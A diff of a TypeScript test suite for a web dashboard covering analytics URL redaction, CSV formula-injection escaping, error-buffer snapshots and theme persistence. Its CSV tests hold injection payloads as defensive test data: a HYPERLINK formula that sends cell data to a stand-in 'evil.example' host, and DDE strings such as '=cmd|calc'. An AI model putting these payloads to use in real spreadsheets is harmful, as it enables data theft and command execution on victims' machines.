@@ -41,6 +41,7 @@ import {
   evaluateSetPanelEnabled,
 } from '../src/config/panel-enablement.ts';
 import { getInitialPanelSettingsForVariant } from '../src/config/panels.ts';
+import { csvRow, sanitizeCsvField } from '../src/utils/csv-escape.ts';
 
 const __dirname = dirname(fileURLToPath(import.meta.url));
 const root = resolve(__dirname, '..');
@@ -56,11 +57,33 @@ describe('#8369-1 Vercel Analytics URL redaction', () => {
     assert.ok(!redacted.url.includes('SEKRET'));
     assert.ok(!redacted.url.includes('tok123'));
     assert.ok(!redacted.url.includes('qsecret'));
-    assert.ok(!redacted.url.includes('a@b.com'));
-    assert.ok(!redacted.url.includes('__clerk_handshake'));
-    assert.ok(!redacted.url.includes('__clerk_foo'));
-    assert.ok(!redacted.url.includes('checkoutProduct'));
-    assert.ok(redacted.url.includes('tab=news'), 'benign params survive');
+    // Assert on PARSED params, never a substring. URLSearchParams percent-
+    // encodes '@' as %40 on re-serialization, so `!includes('a@b.com')` was
+    // unconditionally true the moment any other key was redacted — it could
+    // not fail even with the email still present.
+    const params = new URL(redacted.url).searchParams;
+    assert.equal(params.get('email'), null);
+    assert.equal(params.get('license_key'), null);
+    assert.equal(params.get('__clerk_handshake'), null);
+    assert.equal(params.get('__clerk_foo'), null);
+    assert.equal(params.get('checkoutProduct'), null);
+    assert.equal(params.get('subscription_id'), null);
+    assert.equal(params.get('payment_id'), null);
+    assert.equal(params.get('tab'), 'news', 'benign params survive');
+  });
+
+  it('keeps a redacted absolute URL absolute', () => {
+    // A redacted event must have the same URL shape as an unredacted one, or
+    // the collector sees a different format for exactly the events that
+    // carried a secret.
+    const redacted = redactAnalyticsUrl({
+      type: 'pageview',
+      url: 'https://www.worldmonitor.app/dashboard?token=tok123&tab=news',
+    });
+    assert.ok(
+      redacted.url.startsWith('https://www.worldmonitor.app/'),
+      `expected an absolute URL, got ${redacted.url}`,
+    );
   });
 
   it('scrubs OAuth-style hash fragments without a ?', () => {
@@ -95,13 +118,13 @@ describe('#8369-1 Vercel Analytics URL redaction', () => {
     }
   }
 
-  it('boot strip removes unread secrets (email, Clerk handshake)', () => {
+  it('boot strip removes unread secrets (email, license_key)', () => {
     const replaced = runBootStrip(
-      'https://www.worldmonitor.app/dashboard?email=a@b.com&__clerk_handshake=h&tab=news',
+      'https://www.worldmonitor.app/dashboard?email=a@b.com&license_key=SEKRET&tab=news',
     );
     assert.equal(replaced.length, 1);
     assert.ok(!replaced[0]!.includes('a@b.com'));
-    assert.ok(!replaced[0]!.includes('__clerk_handshake'));
+    assert.ok(!replaced[0]!.includes('SEKRET'));
     assert.ok(replaced[0]!.includes('tab=news'));
     resetVercelAnalyticsForTesting();
   });
@@ -117,23 +140,50 @@ describe('#8369-1 Vercel Analytics URL redaction', () => {
     assert.equal(replaced.length, 0, 'nothing unread to strip, so no replaceState');
     resetVercelAnalyticsForTesting();
   });
+
+  it('boot strip must NOT touch Clerk params — the SDK reads them later', () => {
+    // @clerk/clerk-js loads via requestIdleCallback (scheduleClerkLoad), long
+    // after this runs at main.ts module scope, and reads __clerk_status /
+    // __clerk_created_session (email-link verification) and __clerk_ticket
+    // (ticket sign-in/up) straight off window.location.href with no
+    // dev/prod gating. Stripping them here breaks those flows in production.
+    // They are still kept out of telemetry by redactAnalyticsUrl.
+    const replaced = runBootStrip(
+      'https://www.worldmonitor.app/?__clerk_status=verified&__clerk_created_session=sess_1&__clerk_ticket=tkt_1',
+    );
+    assert.equal(replaced.length, 0, 'Clerk params must survive the boot strip');
+    resetVercelAnalyticsForTesting();
+  });
+
+  it('boot strip leaves a fragment-carried deferred param alone', () => {
+    // The hash path must honor the caller's narrow boot list, not the broad
+    // analytics list — otherwise a fragment-borne ref/checkoutProduct is
+    // deleted before its deferred consumer runs.
+    const replaced = runBootStrip(
+      'https://www.worldmonitor.app/dashboard#/r?ref=abc&checkoutProduct=pro',
+    );
+    assert.equal(replaced.length, 0, 'boot list has no ref/checkoutProduct, so nothing to strip');
+    resetVercelAnalyticsForTesting();
+  });
+
+  it('analytics redaction still scrubs those same fragment params', () => {
+    const redacted = redactAnalyticsUrl({
+      type: 'pageview',
+      url: 'https://www.worldmonitor.app/dashboard#/r?ref=abc&checkoutProduct=pro&keep=1',
+    });
+    assert.ok(!redacted.url.includes('ref=abc'));
+    assert.ok(!redacted.url.includes('checkoutProduct'));
+    assert.ok(redacted.url.includes('keep=1'));
+  });
 });
 
 describe('#8369-2 CSV formula neutralization', () => {
-  // export.ts transitively imports services/i18n (import.meta.glob), which
-  // cannot load under plain node --test — so assert the shipped source
-  // carries the OWASP neutralization contract, and probe the exact logic
-  // with an inline copy of the two-line pure function.
-  const sanitizeCsvField = (value: string): string => {
-    const text = value || '';
-    return /^[=+\-@\t\r\n|]/.test(text) ? `'${text}` : text;
-  };
-
-  it('ships the formula-prefix guard in csvRow', () => {
-    assert.match(exportSrc, /CSV_FORMULA_PREFIX_RE = \/\^\[=\+\\-@\\t\\r\\n\|\]\//);
-    assert.match(exportSrc, /sanitizeCsvField\(v \|\| ''\)\.replace\(\/"\/g/);
-    assert.match(exportSrc, /csvRow\(\[data\.brief\]\)/);
-  });
+  // These call the SHIPPED sanitizeCsvField/csvRow from src/utils/csv-escape.ts.
+  // They previously exercised a hand-copied inline duplicate, which meant the
+  // production guard could be mutated to a no-op with the suite still green —
+  // and the copy had already drifted from the original's null handling.
+  // csv-escape.ts is a zero-import leaf precisely so this import works under
+  // plain `node --test` (export.ts pulls services/i18n -> import.meta.glob).
 
   it('prefixes formula-leading fields with a single quote', () => {
     assert.equal(sanitizeCsvField('=HYPERLINK("https://evil.example/"&A1,"x")'), "'=HYPERLINK(\"https://evil.example/\"&A1,\"x\")");
@@ -141,6 +191,7 @@ describe('#8369-2 CSV formula neutralization', () => {
     assert.equal(sanitizeCsvField('-2+3'), "'-2+3");
     assert.equal(sanitizeCsvField('@mention'), "'@mention");
     assert.equal(sanitizeCsvField('\tindented'), "'\tindented");
+    assert.equal(sanitizeCsvField('|DDE'), "'|DDE");
   });
 
   it('leaves benign fields untouched', () => {
@@ -148,6 +199,38 @@ describe('#8369-2 CSV formula neutralization', () => {
     assert.equal(sanitizeCsvField(''), '');
     assert.equal(sanitizeCsvField('price drop -5%'), 'price drop -5%');
     assert.equal(sanitizeCsvField('2 + 2 = 4'), '2 + 2 = 4');
+  });
+
+  it('handles null/undefined without throwing', () => {
+    assert.equal(sanitizeCsvField(null), '');
+    assert.equal(sanitizeCsvField(undefined), '');
+  });
+
+  // Regression: the leading-'-' escape must not coerce real numbers to text.
+  // csvRow feeds it stringified numerics for flight/vessel Lat+Lon, market
+  // Change, earthquake DepthKm and radiation Value — a western-hemisphere
+  // longitude is negative, and exporting it as "'-73.98" breaks sorting,
+  // charting and SUM() in Excel/Sheets.
+  it('leaves negative numbers numeric', () => {
+    assert.equal(sanitizeCsvField('-73.98'), '-73.98');
+    assert.equal(sanitizeCsvField('-1.25'), '-1.25');
+    assert.equal(sanitizeCsvField('-5'), '-5');
+    assert.equal(sanitizeCsvField('-0.0001'), '-0.0001');
+    assert.equal(sanitizeCsvField('-1e-7'), '-1e-7');
+  });
+
+  it('still escapes formulas that merely look numeric', () => {
+    // Number() rejects each of these, so the guard must still fire.
+    assert.equal(sanitizeCsvField('-2+3'), "'-2+3");
+    assert.equal(sanitizeCsvField('=1+1'), "'=1+1");
+    assert.equal(sanitizeCsvField('+1'), '+1'); // Number('+1') === 1, a real number
+  });
+
+  it('csvRow quotes and escapes a full row end to end', () => {
+    assert.equal(
+      csvRow(['Reuters "wire"', '-73.98', '=cmd|calc', '']),
+      '"Reuters ""wire""","-73.98","\'=cmd|calc",""',
+    );
   });
 });
 
@@ -215,17 +298,19 @@ describe('#8369-3 DebugBear RUM bounded error buffer', () => {
     const h = installHarness('www.worldmonitor.app');
     try {
       initDebugBearRum();
-      const live = { type: 'error', message: 'boom', filename: 'a.js', lineno: 1, colno: 2 } as unknown as Event;
+      const live = { type: 'error', message: 'boom', filename: 'a.js', lineno: 1, colno: 2, timeStamp: 42 } as unknown as Event;
       h.listeners.get('error')!(live);
       const queued = (h.win.dbbRum as unknown[][])[1]!;
       assert.equal(queued[0], 'error');
+      // `reason` is absent (not '') and `timeStamp` is present: both are
+      // required by the collector's decoder — see snapshotRumError.
       assert.deepEqual(queued[1], {
         type: 'error',
+        timeStamp: 42,
         message: 'boom',
         filename: 'a.js',
         lineno: 1,
         colno: 2,
-        reason: '',
       });
       assert.notEqual(queued[1], live);
     } finally {
@@ -275,8 +360,52 @@ describe('#8369-3 DebugBear RUM bounded error buffer', () => {
   it('snapshotRumError never retains object references', () => {
     const domNode = { nodeName: 'DIV' };
     const snap = snapshotRumError({ type: 'unhandledrejection', reason: domNode } as unknown as Event);
-    assert.equal(typeof snap.reason, 'string');
-    assert.ok(!snap.reason.includes('nodeName') || snap.reason.length <= 500);
+    // The previous assertion was `!reason.includes('nodeName') || length <= 500`,
+    // whose second disjunct is unconditionally true because snapshotRumError
+    // always slices to 500 — it would have passed on a live DOM node.
+    assert.equal(snap.reason, '[object Object]');
+    assert.notStrictEqual(snap.reason as unknown, domNode);
+  });
+
+  it('truncates an oversized rejection reason to 500 chars', () => {
+    const snap = snapshotRumError(
+      { type: 'unhandledrejection', reason: 'x'.repeat(600) } as unknown as Event,
+    );
+    assert.equal(snap.reason?.length, 500);
+  });
+
+  // The collector decodes a queued entry as a duck-typed Event. These pin the
+  // two fields its mapper reads that a plain-object snapshot can silently
+  // lose — verified against cdn.debugbear.com's shipped bundle, whose
+  // message resolution is
+  //   e = (t instanceof ErrorEvent) ? t.error : t.reason
+  //   e == null ? ('message' in t ? t.message : 'Message unknown') : String(e)
+  // so a PRESENT reason (even '') shadows message, and timeStamp is read
+  // unconditionally via Math.round(t.timeStamp).
+  it('omits reason for a plain error so the decoder falls through to message', () => {
+    const snap = snapshotRumError(
+      { type: 'error', message: 'boom', filename: 'a.js', lineno: 1, colno: 2, timeStamp: 123 } as unknown as Event,
+    );
+    assert.equal(snap.reason, undefined, 'a present reason would shadow message at the collector');
+    assert.equal(snap.message, 'boom');
+    assert.equal(snap.timeStamp, 123, 'absent timeStamp decodes to NaN -> null');
+
+    // Replay the collector's own message resolution over the snapshot.
+    const t = snap as unknown as Record<string, unknown>;
+    const e = t['reason'];
+    const decodedMessage = e == null
+      ? ('message' in t ? t['message'] : 'Message unknown')
+      : String(e);
+    assert.equal(decodedMessage, 'boom');
+    assert.equal(Number.isFinite(Math.round(snap.timeStamp)), true);
+  });
+
+  it('keeps reason for a genuine rejection', () => {
+    const snap = snapshotRumError(
+      { type: 'unhandledrejection', reason: 'nope', timeStamp: 7 } as unknown as Event,
+    );
+    assert.equal(snap.reason, 'nope');
+    assert.equal(snap.timeStamp, 7);
   });
 });
 
@@ -317,40 +446,169 @@ describe('#8369-4 set_panel_enabled mixed-case catalog IDs', () => {
 });
 
 describe('#8369-5 theme-manager auto preference persistence', () => {
-  // theme-manager imports theme-colors (getComputedStyle at module scope is
-  // lazy, but the graph is DOM-coupled), so assert the shipped source carries
-  // the persist/apply split plus behavioral probes via a regex-extracted
-  // copy of the pure setTheme body. The split is the whole fix: setTheme must
-  // not write localStorage, or 'auto' is clobbered by its resolved value.
-  it('setTheme no longer persists to localStorage', () => {
-    const setThemeBody = themeManagerSrc.slice(
-      themeManagerSrc.indexOf('export function setTheme'),
-      themeManagerSrc.indexOf('export function applyStoredTheme'),
-    );
-    // The only storage write in this slice must be gone: setTheme delegates
-    // to applyTheme, and persistence lives in setThemePreference only.
-    assert.ok(!setThemeBody.includes('localStorage.setItem(STORAGE_KEY, theme)'));
-    assert.match(setThemeBody, /applyTheme\(theme\)/);
-    assert.match(setThemeBody, /Deliberately does NOT persist/);
+  // Behavioral, not source-text. The previous block asserted regexes over the
+  // file (one matched only a code COMMENT's wording), and its slice anchor
+  // `indexOf('export function setTheme')` is a prefix of
+  // `export function setThemePreference` -- both resolve to the same offset,
+  // so it inspected the wrong function entirely. theme-manager's only import
+  // is ./theme-colors (a zero-import leaf), so it loads here with a stub DOM.
+
+  type MediaListener = () => void;
+
+  function installThemeHarness(opts: { stored?: string | null; prefersLight?: boolean; variant?: string } = {}) {
+    const store = new Map<string, string>();
+    if (opts.stored != null) store.set('worldmonitor-theme', opts.stored);
+    const listeners = new Map<string, Set<MediaListener>>();
+    let prefersLight = opts.prefersLight ?? false;
+    const dataset: Record<string, string | undefined> = {};
+    if (opts.variant) dataset['variant'] = opts.variant;
+    const dispatched: string[] = [];
+
+    const mql = {
+      get matches() { return prefersLight; },
+      addEventListener: (type: string, cb: MediaListener) => {
+        if (!listeners.has(type)) listeners.set(type, new Set());
+        listeners.get(type)!.add(cb);
+      },
+      removeEventListener: (type: string, cb: MediaListener) => {
+        listeners.get(type)?.delete(cb);
+      },
+    };
+
+    const saved: Record<string, PropertyDescriptor | undefined> = {
+      window: Object.getOwnPropertyDescriptor(globalThis, 'window'),
+      document: Object.getOwnPropertyDescriptor(globalThis, 'document'),
+      localStorage: Object.getOwnPropertyDescriptor(globalThis, 'localStorage'),
+      CustomEvent: Object.getOwnPropertyDescriptor(globalThis, 'CustomEvent'),
+    };
+    const storage = {
+      getItem: (k: string) => (store.has(k) ? store.get(k)! : null),
+      setItem: (k: string, v: string) => { store.set(k, v); },
+      removeItem: (k: string) => { store.delete(k); },
+    };
+    class FakeCustomEvent { type: string; detail: unknown;
+      constructor(type: string, init?: { detail?: unknown }) { this.type = type; this.detail = init?.detail; } }
+    const win = {
+      matchMedia: () => mql,
+      dispatchEvent: (e: { type: string }) => { dispatched.push(e.type); return true; },
+      localStorage: storage,
+    };
+    const doc = {
+      documentElement: { dataset },
+      querySelector: () => null,
+    };
+    Object.defineProperty(globalThis, 'window', { configurable: true, value: win });
+    Object.defineProperty(globalThis, 'document', { configurable: true, value: doc });
+    Object.defineProperty(globalThis, 'localStorage', { configurable: true, value: storage });
+    Object.defineProperty(globalThis, 'CustomEvent', { configurable: true, value: FakeCustomEvent });
+
+    return {
+      dataset,
+      dispatched,
+      stored: () => store.get('worldmonitor-theme') ?? null,
+      listenerCount: () => listeners.get('change')?.size ?? 0,
+      fireOsChange: (light: boolean) => {
+        prefersLight = light;
+        for (const cb of listeners.get('change') ?? []) cb();
+      },
+      restore: () => {
+        for (const [k, d] of Object.entries(saved)) {
+          if (d) Object.defineProperty(globalThis, k, d);
+          else delete (globalThis as Record<string, unknown>)[k];
+        }
+      },
+    };
+  }
+
+  async function loadThemeManager() {
+    // Cache-bust so each test gets fresh module-level listener state.
+    return import(`../src/utils/theme-manager.ts?t=${Date.now()}${Math.random()}`);
+  }
+
+  it('setThemePreference persists the raw choice, not its resolved value', async () => {
+    const h = installThemeHarness({ prefersLight: true });
+    try {
+      const tm = await loadThemeManager();
+      tm.setThemePreference('auto');
+      assert.equal(h.stored(), 'auto', "'auto' must never be stored as its resolved theme");
+      assert.equal(h.dataset['theme'], 'light', 'auto resolves to the OS scheme');
+      tm.setThemePreference('dark');
+      assert.equal(h.stored(), 'dark');
+      assert.equal(h.dataset['theme'], 'dark');
+    } finally { h.restore(); }
   });
 
-  it("setThemePreference persists the raw 'auto' choice and attaches the listener", () => {
-    const prefBody = themeManagerSrc.slice(
-      themeManagerSrc.indexOf('export function setThemePreference'),
-      themeManagerSrc.indexOf('export function getCurrentTheme'),
-    );
-    assert.match(prefBody, /localStorage\.setItem\(STORAGE_KEY, pref\)/);
-    assert.match(prefBody, /attachAutoListener|autoMediaQuery = window\.matchMedia/);
+  it("an explicit toggle after 'auto' replaces the preference and detaches the listener", async () => {
+    const h = installThemeHarness({ prefersLight: true });
+    try {
+      const tm = await loadThemeManager();
+      tm.setThemePreference('auto');
+      assert.equal(h.listenerCount(), 1, 'auto attaches exactly one matchMedia listener');
+      tm.setThemePreference('dark');
+      assert.equal(h.stored(), 'dark');
+      assert.equal(h.listenerCount(), 0, 'an explicit pick must detach the auto listener');
+      h.fireOsChange(true);
+      assert.equal(h.dataset['theme'], 'dark', 'OS changes must not override an explicit pick');
+    } finally { h.restore(); }
   });
 
-  it('applyStoredTheme restores the auto matchMedia listener on boot', () => {
-    const bootBody = themeManagerSrc.slice(
-      themeManagerSrc.indexOf('export function applyStoredTheme'),
-    );
-    assert.match(bootBody, /if \(raw === 'auto'\) attachAutoListener\(\)/);
+  it("re-selecting 'auto' does not accumulate listeners", async () => {
+    const h = installThemeHarness();
+    try {
+      const tm = await loadThemeManager();
+      tm.setThemePreference('auto');
+      tm.setThemePreference('auto');
+      tm.setThemePreference('auto');
+      assert.equal(h.listenerCount(), 1);
+    } finally { h.restore(); }
   });
 
-  it('explicit UI toggles persist through setThemePreference, not setTheme', () => {
+  it("applyStoredTheme restores the auto listener after reload and follows the OS", async () => {
+    const h = installThemeHarness({ stored: 'auto', prefersLight: false });
+    try {
+      const tm = await loadThemeManager();
+      tm.applyStoredTheme();
+      assert.equal(h.dataset['theme'], 'dark');
+      assert.equal(h.listenerCount(), 1, 'a stored auto must re-attach on boot');
+      h.fireOsChange(true);
+      assert.equal(h.dataset['theme'], 'light', 'the restored listener must repaint');
+      assert.equal(h.stored(), 'auto', 'following the OS must not clobber the preference');
+    } finally { h.restore(); }
+  });
+
+  it('an implicit-auto user (nothing stored) also follows the OS', async () => {
+    const h = installThemeHarness({ stored: null, prefersLight: false });
+    try {
+      const tm = await loadThemeManager();
+      assert.equal(tm.getThemePreference(), 'auto', 'settings UI shows Auto preselected');
+      tm.applyStoredTheme();
+      assert.equal(h.listenerCount(), 1, 'implicit auto must behave like explicit auto');
+      h.fireOsChange(true);
+      assert.equal(h.dataset['theme'], 'light');
+      assert.equal(h.stored(), null, 'following the OS must not create a preference');
+    } finally { h.restore(); }
+  });
+
+  it('happy pins light and does not attach an OS listener', async () => {
+    const h = installThemeHarness({ stored: null, prefersLight: false, variant: 'happy' });
+    try {
+      const tm = await loadThemeManager();
+      tm.applyStoredTheme();
+      assert.equal(h.dataset['theme'], 'light');
+      assert.equal(h.listenerCount(), 0);
+    } finally { h.restore(); }
+  });
+
+  it('exposes no setTheme escape hatch that silently skips persistence', async () => {
+    const tm = await loadThemeManager();
+    assert.equal(
+      (tm as Record<string, unknown>)['setTheme'],
+      undefined,
+      'setTheme used to persist; a same-name non-persisting export would reintroduce the bug',
+    );
+  });
+
+  it('explicit UI toggles route through setThemePreference', () => {
     const mobileNav = readFileSync(resolve(root, 'src/app/mobile-primary-nav.ts'), 'utf8');
     const searchManager = readFileSync(resolve(root, 'src/app/search-manager.ts'), 'utf8');
     assert.match(mobileNav, /setThemePreference\(next\)/);
